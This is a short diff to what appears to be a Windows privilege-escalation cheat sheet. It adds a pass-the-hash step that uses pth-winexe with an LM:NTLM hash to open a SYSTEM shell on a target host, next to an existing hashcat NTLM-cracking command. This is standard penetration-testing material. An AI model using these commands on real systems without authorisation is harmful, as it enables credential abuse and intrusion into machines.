@@ -474,6 +474,15 @@ Look for backups in
 
 * crack NTLM `hashcat -m 1000 --force hash /wordlist`
 
+OR even better login directly win pth-winexe
+
+```powershell
+
+# where hash must include the LM part too
+pth-winexe -U 'user%aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' --system //192.168.111.xxx cmd.exe
+```
+
+
 ### Kernel Exploits
 
 * User Kernel only as last resort to Windows PrivEsc
